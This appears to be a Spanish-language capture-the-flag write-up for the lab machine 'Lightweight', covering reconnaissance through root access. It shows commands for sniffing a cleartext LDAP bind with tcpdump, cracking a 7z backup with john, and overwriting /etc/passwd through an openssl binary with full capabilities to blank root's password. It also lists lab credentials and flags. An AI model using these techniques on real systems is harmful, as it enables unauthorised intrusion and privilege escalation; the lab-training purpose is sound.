RECONOCIMIENTO — Escaneo de puertos

Lo primero es lanzar un escaneo con nmap para ver a qué nos enfrentamos.

escaneo de puertos
nmap -p- -T5 10.129.95.236 -oG allPorts
PUERTO ESTADO SERVICIO
22/tcpOPENssh
80/tcpOPENhttp
389/tcpOPENldap
Superficie de ataque reducida
Solo hay una web, un servidor LDAP y SSH. No es un Active Directory de Windows — el LDAP aquí es OpenLDAP sobre Linux.
// 02

ENUMERACIÓN WEB — Cuenta SSH autogenerada

La web avisa de que está protegida contra fuerza bruta, así que se exploran los ficheros disponibles manualmente hasta dar con /user.php.

Cuenta SSH creada con la IP del visitante
La página explica que el servidor crea automáticamente una cuenta SSH usando la IP del visitante como usuario y contraseña, válida durante un minuto tras la primera petición.

Se comprueba y efectivamente funciona.

acceso ssh con la propia ip
ssh '10.10.15.51'@10.129.95.236

Se entra como el usuario 10.10.15.51. Revisando sus capabilities disponibles en el sistema aparece algo interesante.

capabilities del sistema
getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p /usr/sbin/mtr = cap_net_raw+ep /usr/sbin/suexec = cap_setgid,cap_setuid+ep /usr/sbin/arping = cap_net_raw+p /usr/sbin/clockdiff = cap_net_raw+p /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
tcpdump con capabilities de red
/usr/sbin/tcpdump tiene cap_net_admin y cap_net_raw, lo que permite capturar tráfico de red del sistema sin ser root.
// 03

TCPDUMP — Captura de bind LDAP en texto claro

Como hay un servidor LDAP abierto, se pone tcpdump a escuchar específicamente ese puerto.

captura de tráfico ldap
/usr/sbin/tcpdump -i any port 389 -w capture.cap -v

Mientras se navega por la web, empiezan a llegar paquetes LDAP. Se descarga el .cap y se analiza con Wireshark.

Credenciales LDAP en texto claro
Aparece un bindRequest simple del usuario ldapuser2 (uid=ldapuser2,ou=People,dc=lightweight,dc=htb) cuya contraseña viaja sin cifrar: 8bc8251332abe1d7f105d3e53ad39ac2.

Se accede por SSH con estas credenciales y se recupera la flag de usuario.

acceso y flag
ssh ldapuser2@10.129.95.236 cat user.txt
USER FLAG b523645e7048e52c2a2b6e28aa2cffb2
// 04

BACKUP — Credenciales de ldapuser1

En el home de ldapuser2 hay un fichero backup.7z. Al intentar descomprimirlo pide contraseña, así que se extrae el hash con 7z2john y se crackea con john.

crackeo del backup
7z2john backup.7z > backup_hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash.txt
Contraseña del backup
La contraseña es delete. Dentro hay varios ficheros PHP de la aplicación web (index.php, info.php, reset.php, status.php, user.php).

Revisando status.php aparecen credenciales hardcodeadas para conectar a LDAP.

status.php
$username = 'ldapuser1'; $password = 'f3ca9d298a553da117442deeb6fa932d'; $ldapconfig['host'] = 'lightweight.htb'; $ldapconfig['port'] = '389'; $ldapconfig['basedn'] = 'dc=lightweight,dc=htb';
Credenciales de ldapuser1
Se obtienen las credenciales ldapuser1:f3ca9d298a553da117442deeb6fa932d.
// 05

CAPABILITIES — openssl con todas las capacidades

Se accede por SSH como ldapuser1 y se repite la comprobación de capabilities.

acceso y capabilities
ssh ldapuser1@10.129.95.236 getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep /home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep /home/ldapuser1/openssl = ep
openssl con capabilities completas
El binario propio /home/ldapuser1/openssl tiene el conjunto completo de capabilities (=ep), lo que en la práctica equivale a ejecutarlo con privilegios de root para operaciones de fichero, sin necesidad de sudo ni SUID.

Se abusa de este binario para leer el /etc/passwd real del sistema.

1. lectura del /etc/passwd original
/home/ldapuser1/openssl enc -in /etc/passwd

Con el contenido original como base, se prepara en el equipo atacante una copia modificada donde root no tiene contraseña (campo vacío en /etc/shadow equivalente, simplificado aquí quitando la x del passwd para forzar login sin contraseña vía este mismo binario).

2. /etc/passwd modificado (fragmento)
root::0:0:root:/root:/bin/bash ... ldapuser1:x:1000:1000::/home/ldapuser1:/bin/bash ldapuser2:x:1001:1001::/home/ldapuser2:/bin/bash

Se sube el fichero modificado a la máquina y se usa el mismo openssl con capabilities para sobrescribir el /etc/passwd del sistema.

3. sobrescritura de /etc/passwd
/home/ldapuser1/openssl enc -in /home/ldapuser1/passwd_modified.txt -out /etc/passwd

Con root ahora sin contraseña en el fichero, basta con hacer su.

4. escalada a root
su root cat /root/root.txt
ROOT FLAG 9cbf8aa7255aa552a4004e31c4523b1d
